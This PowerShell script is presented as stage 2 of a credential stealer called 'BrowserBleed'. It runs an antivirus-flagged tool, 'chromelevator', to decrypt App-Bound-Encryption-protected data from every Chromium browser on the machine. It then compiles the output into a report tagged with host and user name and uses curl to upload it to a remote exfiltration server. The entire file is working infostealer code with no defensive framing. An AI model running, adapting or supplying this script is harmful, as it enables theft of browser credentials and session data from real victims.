# Stage 2: App-Bound Encryption extraction (chromelevator) + exfiltrate to report server.
# Distinct from the BrowserBleed payload on purpose: this tool is AV-flagged.
param(
    [string]$ExfilUrl = $env:BB_EXFIL_URL,
    [string]$ApiKey   = $env:BB_API_KEY,
    [string]$OutDir   = (Join-Path $env:TEMP "bb_abe"),
    [string]$Tool     = (Join-Path $PSScriptRoot "chromelevator_x64.exe")
)
$ErrorActionPreference = "Stop"
if (-not $ExfilUrl -or -not $ApiKey) { throw "Set -ExfilUrl/-ApiKey, or BB_EXFIL_URL/BB_API_KEY" }
if (-not (Test-Path $Tool)) { throw "Tool not found: $Tool" }

# 1. Run chromelevator over all supported Chromium browsers
& $Tool all -o $OutDir 2>&1 | Write-Host

# 2. Build a single readable report from the JSON output
$json = Get-ChildItem $OutDir -Recurse -Filter *.json -ErrorAction SilentlyContinue
if (-not $json) { throw "No chromelevator output in $OutDir" }
$report = Join-Path $env:TEMP "bb_abe_report.txt"
$lines = @(
    "BrowserBleed Stage 2 (App-Bound Encryption)",
    "Host: $env:COMPUTERNAME  User: $env:USERNAME  Run: $(Get-Date -Format s)",
    ""
)
foreach ($f in $json) {
    $lines += "===== $($f.FullName.Substring($OutDir.Length)) ====="
    $lines += (Get-Content -Raw $f.FullName)
    $lines += ""
}
$lines | Set-Content -Path $report -Encoding UTF8

# 3. Exfiltrate to the report server (same /upload endpoint BrowserBleed uses)
$resp = curl.exe -s -X POST "$ExfilUrl/upload" -H "Authorization: Bearer $ApiKey" -F "hostname=$env:COMPUTERNAME" -F "txt=@${report};filename=results.txt"
Write-Host "Server response: $resp"
